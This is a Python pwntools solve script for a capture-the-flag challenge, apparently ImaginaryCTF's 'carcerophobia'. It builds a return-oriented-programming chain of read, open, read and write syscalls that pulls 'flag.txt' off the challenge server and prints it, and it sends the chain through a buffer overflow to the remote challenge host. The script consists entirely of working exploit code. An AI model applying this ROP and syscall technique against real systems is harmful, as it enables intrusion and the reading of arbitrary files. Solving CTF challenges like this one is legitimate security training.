from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

elf = ELF("./carcerophobia")
rop = ROP(elf)

pop_rax = rop.find_gadget(["pop rax", "ret"]).address
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
syscall_ret = rop.find_gadget(["syscall", "ret"]).address


def syscall(rax, rdi, rsi, rdx):
    return [pop_rax, rax, pop_rdi, rdi, pop_rsi, rsi, pop_rdx, rdx, syscall_ret]


buf = 0x4DD740
chain = []
chain += syscall(0, 0, buf, 9)
chain += syscall(2, buf, 0, 0)
chain += syscall(0, 3, buf, 100)
chain += syscall(1, 1, buf, 100)
chain = flat(chain)
print(chain)
assert b"\n" not in chain

# io = process("./carcerophobia")
io = remote("carcerophobia.chal.imaginaryctf.org", 42081)
io.sendlineafter(b"ropchain:", b"a" * 16 + chain)
io.send(b"flag.txt\0")
io.interactive()
